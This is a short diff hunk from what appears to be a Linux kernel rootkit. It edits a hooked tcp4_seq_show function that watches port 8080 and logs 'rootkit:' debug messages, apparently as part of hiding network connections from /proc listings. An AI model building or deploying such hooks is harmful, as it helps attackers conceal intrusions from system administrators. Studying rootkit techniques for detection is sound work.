@@ -24,7 +24,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
     long ret;
     unsigned short port = htons(8080);
 
-    if ((struct sock *)v != SEQ_START_TOKEN) {
+    if (v != SEQ_START_TOKEN) {
 		is = (struct inet_sock *)v;
 		if (port == is->inet_sport || port == is->inet_dport) {
 			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
